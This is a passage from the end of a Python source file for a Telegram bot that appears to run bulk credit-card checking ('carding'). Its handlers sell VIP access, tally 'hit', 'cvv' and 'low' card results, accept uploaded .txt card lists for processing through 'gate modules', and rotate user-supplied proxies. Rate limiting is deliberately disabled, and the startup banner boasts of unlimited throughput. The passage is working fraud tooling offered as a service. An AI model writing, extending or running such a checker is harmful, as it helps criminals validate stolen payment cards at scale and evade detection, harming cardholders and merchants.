    bot.reply_to(message, f"✅ User <code>{target_id}</code> added as VIP!\nExpiry: <code>{expiry_str}</code>")
    
    try: 
        bot.send_message(target_id, f"{get_emj('🎉')} <b>CONGRATS!</b>\nYour VIP status has been activated for {days} days.\nExpiry: {expiry_str}")
    except: 
        pass

@bot.message_handler(commands=["adminstats"])
def admin_stats(message):
    if str(message.chat.id) != str(ADMIN_ID):
        return
    
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) as total FROM users')
        total_users = cursor.fetchone()['total']
        
        cursor.execute('''
            SELECT COUNT(*) as total FROM users 
            WHERE vip_expiry IS NOT NULL AND vip_expiry > datetime('now')
        ''')
        active_vip = cursor.fetchone()['total']
        
        cursor.execute('SELECT COUNT(*) as total FROM usage_logs')
        total_checks = cursor.fetchone()['total']
        
        cursor.execute('SELECT COUNT(*) as total FROM usage_logs WHERE status = "hit"')
        total_hits = cursor.fetchone()['total']
        
        cursor.execute('SELECT COUNT(*) as total FROM usage_logs WHERE status = "cvv"')
        total_cvv = cursor.fetchone()['total']
        
        cursor.execute('SELECT COUNT(*) as total FROM usage_logs WHERE status = "low"')
        total_low = cursor.fetchone()['total']
        
        cursor.execute('''
            SELECT COUNT(*) as total FROM usage_logs 
            WHERE checked_at > datetime('now', '-1 day')
        ''')
        recent_activity = cursor.fetchone()['total']
        
        cursor.execute('''
            SELECT user_id, total_checks 
            FROM users 
            ORDER BY total_checks DESC 
            LIMIT 5
        ''')
        top_users = cursor.fetchall()
    
    text = f"""
{get_emj('📊')} <b>ADMIN STATISTICS</b> {get_emj('📊')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('👥')} Total Users: <code>{total_users}</code>
{get_emj('💎')} Active VIP: <code>{active_vip}</code>
{get_emj('🔄')} Total Checks: <code>{total_checks}</code>
{get_emj('🔥')} Total Hits: <code>{total_hits}</code>
{get_emj('💎')} Total CVV: <code>{total_cvv}</code>
{get_emj('💰')} Total Low: <code>{total_low}</code>
{get_emj('⏳')} 24h Activity: <code>{recent_activity}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🏆')} <b>TOP USERS:</b>
"""
    
    for i, user in enumerate(top_users, 1):
        text += f"  {i}. <code>{user['user_id']}</code> - {user['total_checks']} checks\n"
    
    bot.reply_to(message, text)

@bot.message_handler(commands=["broadcast"])
def broadcast(message):
    if str(message.chat.id) != str(ADMIN_ID): 
        return
    
    msg_text = message.text.replace("/broadcast ", "")
    if not msg_text or msg_text == "/broadcast":
        bot.reply_to(message, "Usage: /broadcast [message]")
        return
    
    with db_pool.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users')
        all_users = [row['user_id'] for row in cursor.fetchall()]
    
    if str(ADMIN_ID) not in all_users: 
        all_users.append(str(ADMIN_ID))
    
    success = 0
    fail = 0
    
    for user_id in all_users:
        try:
            bot.send_message(user_id, f"{get_emj('📢')} <b>ADMIN BROADCAST:</b>\n\n{msg_text}")
            success += 1
            time.sleep(0.05)
        except: 
            fail += 1
    
    bot.reply_to(message, f"✅ Broadcast sent!\nSuccess: {success}\nFailed: {fail}")

# --- PROXY COMMANDS ---
@bot.message_handler(commands=["setproxy"])
def set_proxy_command(message):
    user_id = message.chat.id
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, 
            f"{get_emj('📌')} <b>PROXY USAGE:</b>\n\n"
            f"<b>Single Proxy:</b>\n"
            f"<code>/setproxy http://user:pass@ip:port</code>\n"
            f"<code>/setproxy http://ip:port</code>\n"
            f"<code>/setproxy socks5://user:pass@ip:port</code>\n\n"
            f"<b>Multiple Proxies (Send .txt file):</b>\n"
            f"Send a .txt file with proxies (one per line)")
        return
    
    proxy_url = args[1]
    
    if '://' not in proxy_url:
        proxy_url = f'http://{proxy_url}'
    
    proxy_manager.set_user_proxy(user_id, proxy_url)
    bot.reply_to(message, f"{get_emj('✅')} <b>PROXY SET!</b>\n\nURL: <code>{proxy_url}</code>")

@bot.message_handler(commands=["removeproxy"])
def remove_proxy_command(message):
    user_id = message.chat.id
    proxy_manager.remove_user_proxy(user_id)
    bot.reply_to(message, f"{get_emj('✅')} <b>PROXY REMOVED!</b>")

@bot.message_handler(commands=["proxyinfo"])
def proxy_info(message):
    user_id = message.chat.id
    current_proxy = proxy_manager.get_current_proxy_url(user_id)
    
    if current_proxy:
        text = f"""
{get_emj('🌐')} <b>YOUR PROXY STATUS</b> {get_emj('🌐')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('✅')} Status: <b>ENABLED</b>
{get_emj('🔗')} Proxy: <code>{current_proxy}</code>
{get_emj('🔄')} Type: <b>User Proxy</b>
"""
    else:
        text = f"""
{get_emj('🌐')} <b>YOUR PROXY STATUS</b> {get_emj('🌐')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('❌')} Status: <b>DISABLED</b>
{get_emj('ℹ️')} Using: <b>Direct Connection</b>
"""
    bot.reply_to(message, text)

# --- FILE HANDLERS ---
@bot.message_handler(content_types=["document"])
def handle_docs(message):
    if not is_user_allowed(message.chat.id) and str(message.chat.id) != str(ADMIN_ID):
        bot.reply_to(message, f"{get_emj('❌')} Buy VIP first!")
        return
    
    file_info = bot.get_file(message.document.file_id)
    file_name = message.document.file_name
    
    if not file_name.endswith('.txt'):
        bot.reply_to(message, f"{get_emj('❌')} Please send a .txt file!")
        return
    
    downloaded = bot.download_file(file_info.file_path)
    path = f"file_{message.document.file_id}.txt"
    with open(path, "wb") as f: 
        f.write(downloaded)
    
    with open(path, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f.readlines() if line.strip()]
    
    os.remove(path)
    
    if not lines:
        bot.reply_to(message, f"{get_emj('❌')} Empty file!")
        return
    
    is_proxy_file = False
    for line in lines[:5]:
        if '://' in line or (':' in line and '.' in line and len(line.split(':')) >= 2):
            is_proxy_file = True
            break
    
    if is_proxy_file and len(lines) > 1:
        count = proxy_manager.set_user_proxy_list(message.chat.id, lines)
        bot.reply_to(message, f"{get_emj('✅')} <b>{count} PROXIES LOADED!</b>\n\nAuto-rotation enabled.")
        return
    
    # Rate limit is disabled
    # allowed, msg = rate_limiter.check_limit(message.chat.id)
    # if not allowed:
    #     bot.reply_to(message, f"⚠️ {msg}")
    #     return
    
    process_card_file(message, lines)

# --- CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_cb(call):
    user_id = call.message.chat.id
    if user_id in active_checks:
        active_checks[user_id]['stop_event'] = True
        thread_pool.cancel_user_tasks(user_id)
        bot.answer_callback_query(call.id, "🛑 Stopping...")
        logger.info(f"User {user_id} stopped checking")
    else: 
        bot.answer_callback_query(call.id, "❌ No active session.")

@bot.callback_query_handler(func=lambda call: call.data == 'n')
def n_cb(call):
    bot.answer_callback_query(call.id)

# --- MAIN ---
if __name__ == "__main__":
    bot.delete_webhook()
    print("="*50)
    print("✅ GOOD HQ BOT STARTED (Professional Edition)")
    print("="*50)
    print(f"📊 Database: {DB_FILE}")
    print(f"📁 Results Dir: {RESULTS_DIR}")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"📦 Gate Modules: {len(GATE_MODULES)}")
    print(f"⚡ Thread Pool: 30 workers")
    print(f"🔗 DB Pool: 20 connections")
    print("="*50)
    print("📌 PROFESSIONAL FEATURES:")
    print("  ✅ Unlimited Rate (No Limits)")
    print("  ✅ HTML Tag Cleaner")
    print("  ✅ Optimized Delay (0.02s)")
    print("  ✅ Connection Pooling")
    print("  ✅ Global Thread Pool")
    print("  ✅ Database Indexes")
    print("  ✅ Logging System")
    print("  ✅ Memory Caching")
    print("  ✅ Task Cancellation")
    print("  ✅ Auto-retry on DB lock")
    print("="*50)
    logger.info("Bot started successfully (Professional Edition)")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
